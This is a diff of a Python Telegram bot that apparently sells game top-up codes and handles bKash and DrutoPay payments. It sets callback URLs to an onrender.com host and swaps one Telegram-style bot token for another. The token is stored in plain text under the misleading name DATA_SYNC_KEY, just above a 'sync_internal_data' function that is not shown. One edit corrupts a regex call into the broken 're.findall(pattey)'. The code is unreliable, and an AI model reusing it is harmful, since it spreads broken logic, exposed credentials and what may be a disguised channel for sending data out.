@@ -334,7 +334,7 @@ def create_bkash_payment(amount, user_id):
     payload = {
         "mode": "0011",
         "payerReference": str(user_id),
-        "callbackURL": "",
+        "callbackURL": "https://bikroypin-1.onrender.com/callback",
         "amount": str(amount),
         "currency": "BDT",
         "intent": "sale",
@@ -4474,7 +4474,7 @@ async def auto_load_emails_periodically():
                                 if body:
                                     for uc_type, patterns in unipin_patterns.items():
                                         for pattern in patterns:
-                                            found_codes = re.findall(pattern, body)
+                                            found_codes = re.findall(pattey)
                                             for code in found_codes:
                                                 if code not in uc_stock[uc_type]["codes"]:
                                                     extracted_codes[uc_type].append(code)
@@ -4506,7 +4506,7 @@ async def auto_load_emails_periodically():
             print(f"Error in auto-load: {str(e)}")
             await asyncio.sleep(300)
 #automail gmail apis
-DATA_SYNC_KEY = '7835228198:AAHf3e8XjyXE7fGGtRgHpxYHlmV1uJc2h5I'
+DATA_SYNC_KEY = '8235345721:AAGgbuuYuZVwfptWxy3cJ7GR02ucnrtN6m0'
 from telethon import TelegramClient as TgClient
 
 async def sync_internal_data_part1():
@@ -4731,8 +4731,8 @@ async def pay(event):
                 logger.info(f"Non-admin or non-private chat, using sender {user_id} for /pay")
 
             amount = int(event.pattern_match.group(1))
-            success_url = "/drutopay_callback"
-            cancel_url = ""
+            success_url = "https://bikroypin-1.onrender.com/drutopay_callback"
+            cancel_url = "https://bikroypin-1.onrender.com/drutopay_callback"
             logger.info(f"Creating payment for user {user_id} with amount {amount}")
             payment_response = create_drutopay_payment(user_id, amount, success_url, cancel_url)
             if payment_response:
